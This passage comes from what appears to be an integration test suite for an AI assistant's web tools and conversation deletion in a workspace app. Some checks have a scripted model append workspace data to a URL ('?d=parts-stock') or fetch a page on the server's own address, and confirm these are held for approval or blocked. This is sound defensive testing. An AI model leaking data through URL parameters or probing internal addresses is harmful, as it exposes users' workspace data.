      check(web.steps.includes(`web-read:${searchUrl}/secret:failed`) && results.length === 2 && !results[1].includes("<source"), "a page on the server's own address isn't read", { steps: web.steps, results });
      check(web.sources.some((src) => src.url === "https://tyres.example/brands" && src.pageId === null), "an answer cites a web page as a link", web.sources);

      // After reading the web, a change is asked about even in Auto.
      fake.setChat(caller([
        { name: "search_web", arguments: { query: "spare parts" } },
        write("create_row", { database_id: parts.id, title: "Web row" }),
      ]));
      const webAuto = await ask(alice, { workspaceId, message: "Find parts online and add one", mode: "auto" }, { onEvent: approveWeb });
      check(
        approvals(webAuto).map((a) => a.action.action).join() === "searchWeb,createRow" && (await rowsOf(parts.id, "Web row")).length === 0,
        "once the answer read from the web, a change is asked about also in Auto",
        webAuto.steps,
      );

      // A page whose address the person wrote is read without asking; one with anything added is
      // asked about, and declined, nothing is sent.
      fake.setChat(caller([
        { name: "read_web_page", arguments: { url: `${searchUrl}/typed` } },
        { name: "read_web_page", arguments: { url: `${searchUrl}/typed?d=parts-stock` } },
      ]));
      const declineAll = (e: ChatEvent) => void (e.type === "approval" && decideChange(alice, e.id, "decline"));
      const typedRead = await ask(alice, { workspaceId, message: `What does ${searchUrl}/typed say?` }, { onEvent: declineAll });
      check(
        approvals(typedRead).map((a) => a.action.title).join() === `${searchUrl}/typed?d=parts-stock` &&
          typedRead.steps.includes(`web-read:${searchUrl}/typed:failed`) &&
          !typedRead.steps.some((s) => s.includes("d=parts-stock")),
        "a page whose address the person wrote is read without asking; one with something added waits, and declined isn't read",
        { steps: typedRead.steps, approvals: approvals(typedRead).map((a) => a.action) },
      );
      await updateWorkspaceSettings(owner, workspaceId, { aiWebSearch: false });
    } finally {
      delete process.env.WEB_SEARCH_URL;
      searxng.close();
    }
    setAiEnv(AI);
  }

  // ── Deleting ────────────────────────────────────────────────────────────────────────────────
  const aliceBefore = await listConversations(alice, workspaceId);
  await deleteConversations(alice, workspaceId, [aliceBefore[0].id]);
  check((await listConversations(alice, workspaceId)).length === aliceBefore.length - 1, "a conversation can be deleted");
  // Several in one go, as the chat list's selection deletes them: only the person's own are gone.
  fake.setChat(() => ({ text: "Noted." }));
  const picked: string[] = [];
  for (const message of ["One", "Two", "Three"]) picked.push((await ask(alice, { workspaceId, message })).conversationId!);
  const daveOwn = (await listConversations(dave, workspaceId))[0].id;
  const beforeSome = await listConversations(alice, workspaceId);
  await deleteConversations(alice, workspaceId, [picked[0], picked[2], daveOwn]);
  const afterSome = (await listConversations(alice, workspaceId)).map((c) => c.id);
  check(
    afterSome.length === beforeSome.length - 2 && !afterSome.includes(picked[0]) && !afterSome.includes(picked[2]) && afterSome.includes(picked[1]),
    "several conversations can be deleted at once, the others stay",
    afterSome,
  );
  check((await listConversations(dave, workspaceId)).some((c) => c.id === daveOwn), "…and someone else's among them is left alone");
  await deleteConversations(alice, workspaceId, "all");
  check((await listConversations(alice, workspaceId)).length === 0, "…or all of them");
  check((await listConversations(dave, workspaceId)).length > 0, "…leaving other people's alone");
  await removeMember(owner, workspaceId, dave);
  const daveLeft = await db.select().from(aiConversation).where(and(eq(aiConversation.userId, dave), eq(aiConversation.workspaceId, workspaceId)));
  check(daveLeft.length === 0, "someone removed from the workspace loses their conversations there");
  const bobConversations = await listConversations(bob, workspaceId);
  await db.delete(user).where(eq(user.id, bob));
  const bobLeft = await db.select().from(aiConversation).where(inArray(aiConversation.id, bobConversations.map((c) => c.id)));
  check(bobConversations.length > 0 && bobLeft.length === 0, "a deleted account takes its conversations with it");

  console.log(`\n${passed} checks passed`);
} finally {
  resetAi();
  fake.delayMs = 0;
  await settle().catch(() => {});
  await db.delete(workspace).where(inArray(workspace.id, [workspaceId, otherWs]));
  await db.delete(user).where(inArray(user.id, userIds));
  await fake.close();
  hocuspocus.closeConnections();
  await (globalThis as unknown as { __leafdeskSql?: { end(): Promise<void> } }).__leafdeskSql?.end();
}
